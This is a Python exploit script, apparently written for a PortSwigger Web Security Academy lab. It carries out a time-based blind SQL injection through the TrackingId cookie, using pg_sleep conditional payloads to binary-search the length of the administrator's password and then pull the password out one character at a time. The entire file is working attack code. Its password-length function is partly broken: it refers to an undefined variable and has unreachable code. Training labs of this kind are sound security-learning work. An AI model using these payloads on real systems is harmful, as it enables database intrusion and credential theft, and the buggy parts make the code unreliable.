import string
import requests

# ==================== CONFIGURATION (CHANGE PER LAB) ====================
LAB_URL = "https://0aba00d804d5cef181c4cf03002b00dc.web-security-academy.net/"
BASE_TRACKING_ID = "a9uL8B6fs1fJqqLB"
SESSION_COOKIE = "cIlbc6HXt71bXfmjpAsxQzqcdsdA6dZs"
# ========================================================================

HOST = LAB_URL.replace("https://", "").replace("http://", "").rstrip("/")

headers = {
    "Host": HOST,
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "User-Agent": (
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)"
        " Chrome/154.0.0.0 Safari/537.36"
    ),
    "Origin": LAB_URL.rstrip("/"),
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
}


def send_request(tracking_payload):
  """Sends a request with the modified TrackingId cookie and returns True if the success condition is met."""
  cookies = {
      "TrackingId": BASE_TRACKING_ID + tracking_payload,
      "session": SESSION_COOKIE,
  }
  try:
    response = requests.get(
        LAB_URL, headers=headers, cookies=cookies, timeout=10
    )
    return response.elapsed.total_seconds()
  except requests.exceptions.RequestException as e:
    print(f"[-] Request error: {e}")
    return False


def is_vulnerable(delay_seconds) :
    payload = f"' || pg_sleep({delay_seconds})--"

    response = send_request(payload)

    if response > delay_seconds :
        return True
    else:
        return False

def find_password_length() :
    low = 0
    high = 50

    while high >= low:
        guess = (high + low) // 2

        gt_pld = f"' || (SELECT CASE WHEN ((SELECT LENGTH(password) FROM users WHERE username = 'administrator') < {guess}) THEN pg_sleep(4) ELSE pg_sleep(0) END) --"

        lt_pld = f"' || (SELECT CASE WHEN ((SELECT LENGTH(password) FROM users WHERE username = 'administrator') > {guess}) THEN pg_sleep(4) ELSE pg_sleep(0) END) --"

        if send_request(gt_pld) >= 3.8:
            high = guess - 1
        else:
            if send_request(lt_pld) >= 3.8:
                low = guess + 1
            else:
                return guess
    if send_request(eq_pld) >= 3.8:
        return guess
        return 0

def get_passwd(length):
  print(
      "[*] Extracting administrator password using Binary Search (O(log"
      " n))..."
  )

  # Sorted by exact ASCII order (48-57 digits, 65-90 uppercase, 97-122 lowercase)
  chars = sorted(
      string.ascii_lowercase + string.digits + string.ascii_uppercase
  )
  password = ""

  for i in range(1, length + 1):
    low = 0
    high = len(chars) - 1
    char_found = None

    while low <= high:
      mid = (low + high) // 2
      guess_char = chars[mid]
      ascii_val = ord(guess_char)

      # 1. Uses ASCII() + ord() to prevent database collation mismatches
      # 2. Wraps (SELECT CASE ... END) in parentheses
      # 3. Uses ascii_val (from mid), not i
      payload = (
          f"' || (SELECT CASE WHEN ((SELECT ASCII(SUBSTRING(password,{i},1))"
          f" FROM users WHERE username = 'administrator') > {ascii_val}) THEN"
          " pg_sleep(4) ELSE pg_sleep(0) END)--"
      )

      # 4. Checks >= 3.8 seconds instead of truthiness of a float
      if send_request(payload) >= 3.8:
        low = mid + 1
      else:
        eq_payload = (
            "' || (SELECT CASE WHEN ((SELECT"
            f" ASCII(SUBSTRING(password,{i},1)) FROM users WHERE username ="
            f" 'administrator') = {ascii_val}) THEN pg_sleep(4) ELSE"
            " pg_sleep(0) END)--"
        )
        if send_request(eq_payload) >= 3.8:
          char_found = guess_char
          break
        else:
          high = mid - 1

    if char_found:
      password += char_found
      print(f"[+] Progress: {password}")
    else:
      print(f"[-] Could not find character at position {i}")
      break

  return password


def main():
    if is_vulnerable(4) :
        print(f"\n[+] The app is vulnerable to time delays :)")

        pass_len = find_password_length()

        if pass_len > 0:
            print(f"\n[+] Password Length Found : {pass_len}")

            passwd = get_passwd(pass_len)
            if passwd == "":
                print ("[-] Password couldn't be determined :('")
            else:
                print (f"[+] Password Found! : {passwd}")
        else:
            print(f"\n[-] Password length couldn't be extracted :('")

    else:
        print (f"\n[-] The app is not vulnerable to time delays :(")

if __name__ == '__main__':
    main()

